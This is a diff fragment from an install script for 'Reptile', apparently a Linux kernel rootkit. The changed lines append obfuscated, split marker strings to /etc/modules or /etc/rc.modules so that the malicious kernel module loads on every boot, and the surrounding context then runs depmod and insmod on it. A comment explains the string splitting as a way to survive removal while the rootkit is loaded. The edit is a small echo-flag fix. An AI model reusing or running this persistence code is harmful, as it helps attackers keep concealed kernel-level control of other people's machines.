@@ -127,18 +127,18 @@ function reptile_install {
     
     	if [ "$SYSTEM" == "debian" ] || [ "$SYSTEM" == "ubuntu" ]; then
 		# we have to break these strings, cause when Reptile is loaded, this script may fail to remove
-        	echo -e "#<rep" >> /etc/modules \  
-		echo -e "tile>\nreptile\n#</rep" >> /etc/modules \
-		echo -e "tile>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+        	echo -ne "#<rep" >> /etc/modules \  
+		echo -ne "tile>\nreptile\n#</rep" >> /etc/modules \
+		echo -ne "tile>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     	elif [ "$SYSTEM" == "redhat" ] || [ "$SYSTEM" == "centos" ] || [ "$SYSTEM" == "fedora" ]; then
-        	echo -e "#<rep" >> /etc/rc.modules \
-		echo -e "tile>\nreptile\n#</rep" >> /etc/rc.modules \
-		echo -e "tile>" >> /etc/rc.modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+        	echo -ne "#<rep" >> /etc/rc.modules \
+		echo -ne "tile>\nreptile\n#</rep" >> /etc/rc.modules \
+		echo -ne "tile>" >> /etc/rc.modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 		chmod +x /etc/rc.modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 	#elif [ "$SYSTEM" == "arch" ]; then
-        #	echo -e "#<rep" >> /etc/modules \
-	#	echo -e "tile>\nreptile\n#</rep" >> /etc/modules \
-	#	echo -e "tile>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+        #	echo -ne "#<rep" >> /etc/modules \
+	#	echo -ne "tile>\nreptile\n#</rep" >> /etc/modules \
+	#	echo -ne "tile>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     	fi
     	
 	depmod && insmod /$MODULE/$MODULE.ko && \
